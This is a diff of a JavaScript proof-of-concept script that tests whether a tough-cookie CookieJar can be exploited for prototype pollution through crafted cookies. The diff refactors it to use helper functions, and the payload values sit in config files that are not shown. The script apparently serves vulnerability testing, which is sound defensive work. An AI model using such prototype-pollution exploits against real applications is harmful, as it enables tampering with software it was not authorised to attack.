@@ -18,40 +18,25 @@
         Expected Output: "EXPLOIT FAILED"
 */
 
-var assert = require('assert');
-var tough = require("tough-cookie");
-var {config, cookies} = require("./lib/config.js");
-var { setCookies } = require("./lib/util/index.js");
+const {config, cookies} = require("./lib/config.js");
+const {setCookies, isCookiePolluted, createVulnerableJar} = require("./lib/util/index.js");
 
-async function exploitPollution() {
-  const jar = new tough.CookieJar(undefined, { rejectPublicSuffixes: config.rejectPublicSuffixes });
-
+const exploitPollution = async () => {
   try {
-      // Exploit cookies
-    await setCookies(jar, [
-        cookies.exploitCookie,
-        cookies.normalCookie
-      ], config.testUrl);
+    // Create a vulnerable CookieJar instance.
+    const jar = createVulnerableJar();
+    // Set the cookies.
+    await setCookies(jar, cookies);
 
-    // Exploit cookie
-    // await setCookie(jar, `${config.exploitCookieName}=${config.exploitCookieValue}; Domain=${config.cookieDomain}; Path=${config.cookiePath}`, config.testUrl);
-    //
-    // // Normal cookie
-    // await setCookie(jar, `${config.normalCookieName}=${config.normalCookieValue}; Domain=${config.googleCookieDomain}; Path=${config.cookiePath}`, config.normalUrl);
-
-    // Check for pollution
+    // Check if the prototype exploit worked.
     const obj = {};
     const pollutedObject = obj[config.cookiePath] && obj[config.cookiePath][config.exploitCookieName];
+    isCookiePolluted(pollutedObject?.value);
 
-    if (pollutedObject?.value === config.exploitCookieValue) {
-      log(config.exploitedSuccessfully);
-    } else {
-      log(config.exploitFailed);
-    }
   } catch (e) {
-    log(`${config.exploitError}: ${e.message}`);
-    log(config.exploitFailed);
+    console.log(`${config.exploitError}: ${e.message}`);
+    console.log(config.exploitFailed);
   }
-}
+};
 
 exploitPollution();
